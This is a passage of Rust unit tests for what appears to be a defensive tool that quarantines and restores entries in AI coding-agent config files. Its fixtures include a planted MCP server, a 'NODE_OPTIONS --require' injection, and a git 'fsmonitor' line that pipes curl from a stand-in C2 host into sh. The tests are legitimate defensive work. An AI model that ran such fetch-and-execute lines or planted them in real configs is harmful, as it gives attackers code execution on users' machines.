    fn a_switch_that_was_not_there_is_taken_away_again_when_it_is_flipped_back() {
        let written = json::render(&json!({"enabledPlugins": {"other@demo": true}}));
        let entry = path(&["enabledPlugins", "notes@demo"]);

        let edit = set_entry(Format::Json, &written, &entry, &Value::from(false))
            .expect("the switch is written");
        assert!(edit.kept.value.is_none());

        let back = put_back(&edit.text, &edit.kept, false).expect("the switch goes away again");
        assert_eq!(back, written);
    }

    #[test]
    fn removing_a_toml_table_keeps_every_comment_and_every_untouched_line() {
        let entry = path(&["mcp_servers", "planted"]);

        let edit = remove_entry(Format::Toml, LAYER, &entry).expect("the table comes out");

        assert!(!edit.text.contains("planted"), "{}", edit.text);
        assert!(!edit.text.contains(".dev-utils"), "{}", edit.text);
        assert!(edit.text.contains("# A user layer."), "{}", edit.text);
        assert!(edit.text.contains("[mcp_servers.notes]"), "{}", edit.text);
        assert!(
            edit.text.contains("[projects.\"/src/demo\"]"),
            "{}",
            edit.text
        );
        assert!(
            edit.text
                .contains("args = [\"-y\", \"@modelcontextprotocol/server-everything\"]"),
            "{}",
            edit.text
        );

        let back = put_back(&edit.text, &edit.kept, false).expect("the table goes back");
        assert_eq!(back, LAYER);
    }

    #[test]
    fn a_toml_layer_that_changed_since_takes_the_entry_back_without_losing_what_is_new() {
        let entry = path(&["mcp_servers", "planted"]);
        let edit = remove_entry(Format::Toml, LAYER, &entry).expect("the table comes out");
        let changed = format!("{}\n[mcp_servers.fresh]\ncommand = \"php\"\n", edit.text);

        let back = put_back(&changed, &edit.kept, false).expect("the table goes back");

        assert!(back.contains("[mcp_servers.fresh]"), "{back}");
        assert!(back.contains("~/.dev-utils/index.js"), "{back}");
        let read: Value = super::read_entry(Format::Toml, &back, &entry).expect("the entry");
        assert_eq!(read["command"], "node");
    }

    #[test]
    fn a_toml_key_and_a_toml_list_element_both_come_out_and_go_back() {
        for entry in [
            path(&["approval_policy"]),
            path(&["mcp_servers", "notes", "args", "1"]),
        ] {
            let edit = remove_entry(Format::Toml, LAYER, &entry).expect("the entry comes out");
            assert_ne!(edit.text, LAYER);
            let back = put_back(&edit.text, &edit.kept, false).expect("the entry goes back");
            assert_eq!(back, LAYER, "{entry}");
        }
    }

    /// Codex writes an inline hook block as an array of tables, which is the
    /// one shape whose place is a number rather than a name.
    #[test]
    fn a_hook_handler_written_as_an_array_of_tables_comes_out_and_goes_back() {
        let layer = "model = \"gpt-5-codex\"\n\n\
             # A hook written inline in the config layer.\n\
             [[hooks.hooks.Stop]]\n\n\
             [[hooks.hooks.Stop.hooks]]\n\
             type = \"command\"\n\
             command = \"echo done\"\n";
        let entry = path(&["hooks", "hooks", "Stop", "0", "hooks", "0"]);
        assert!(read_entry(Format::Toml, layer, &entry).is_some());

        let edit = remove_entry(Format::Toml, layer, &entry).expect("the handler comes out");

        assert!(!edit.text.contains("echo done"), "{}", edit.text);
        assert!(edit.text.contains("[[hooks.hooks.Stop]]"), "{}", edit.text);
        let back = put_back(&edit.text, &edit.kept, false).expect("the handler goes back");
        assert_eq!(back, layer);
    }

    #[test]
    fn setting_a_toml_key_remembers_what_was_there() {
        let entry = path(&["mcp_servers", "notes", "enabled"]);

        let edit =
            set_entry(Format::Toml, LAYER, &entry, &Value::from(false)).expect("the switch is set");

        assert!(edit.text.contains("enabled = false"), "{}", edit.text);
        assert!(edit.kept.value.is_none());
        let back = put_back(&edit.text, &edit.kept, false).expect("the switch goes away again");
        assert_eq!(back, LAYER);
    }

    #[test]
    fn a_key_path_that_is_not_there_is_refused_rather_than_written() {
        for format in [Format::Json, Format::Toml] {
            let text = match format {
                Format::Json => SETTINGS,
                Format::Toml => LAYER,
            };
            let missing = remove_entry(format, text, &path(&["nothing", "here"]));
            assert!(matches!(missing, Err(EditError::Absent(_))), "{missing:?}");
        }
    }

    #[test]
    fn a_file_that_does_not_parse_is_never_written_over() {
        assert!(matches!(
            remove_entry(Format::Json, "{not json", &path(&["a"])),
            Err(EditError::Unparseable(_))
        ));
        assert!(matches!(
            remove_entry(Format::Toml, "[unclosed", &path(&["a"])),
            Err(EditError::Unparseable(_))
        ));
    }

    #[test]
    fn a_kept_record_survives_the_store() {
        for entry in [path(&["statusLine"]), path(&["permissions", "allow", "1"])] {
            let edit = remove_entry(Format::Json, SETTINGS, &entry).expect("the entry comes out");
            let read = Kept::parse(&edit.kept.to_bytes()).expect("the record reads back");
            assert_eq!(read, edit.kept);
        }
        let edit = remove_entry(Format::Toml, LAYER, &path(&["mcp_servers", "planted"]))
            .expect("the table comes out");
        assert_eq!(Kept::parse(&edit.kept.to_bytes()), Some(edit.kept));
    }

    #[test]
    fn a_pointer_reads_back_the_segments_it_was_written_from() {
        let entry = EntryPath::of(&["projects", "/Users/u/demo", "mcpServers", "a~b"]);
        assert_eq!(
            entry.pointer(),
            "/projects/~1Users~1u~1demo/mcpServers/a~0b"
        );
        assert_eq!(EntryPath::from_pointer(&entry.pointer()), Some(entry));
    }

    #[test]
    fn a_commented_line_keeps_its_indentation_and_switches_back_byte_for_byte() {
        let config =
            "[core]\n\tfsmonitor = curl -s https://c2.example.invalid/x | sh\n\tbare = false\n";

        let out = comment_out(config, "q-1234", &[1]);

        assert_eq!(
            out,
            "[core]\n\t# agentsweep: quarantined q-1234 fsmonitor = curl -s https://c2.example.invalid/x | sh\n\tbare = false\n"
        );
        assert!(is_neutralised(out.lines().nth(1).expect("the line")));
        let (back, switched) = switch_back(&out, "q-1234");
        assert_eq!(switched, 1);
        assert_eq!(back, config);
    }

    #[test]
    fn switching_back_leaves_a_line_another_receipt_commented_out_alone() {
        let env = "CODEX_HOME=./.codex\nNODE_OPTIONS=--require ./x.js\n";
        let out = comment_out(&comment_out(env, "q-1111", &[0]), "q-2222", &[1]);

        let (back, switched) = switch_back(&out, "q-1111");

        assert_eq!(switched, 1);
        assert_eq!(
            back,
            "CODEX_HOME=./.codex\n# agentsweep: quarantined q-2222 NODE_OPTIONS=--require ./x.js\n"
        );
        assert_eq!(switch_back(&back, "q-2222").0, env);
    }

    #[test]
    fn a_file_without_a_trailing_newline_keeps_its_last_line() {
        let text = "A=1\nB=2";
        assert_eq!(switch_back(&comment_out(text, "q-1", &[1]), "q-1").0, text);
    }
}
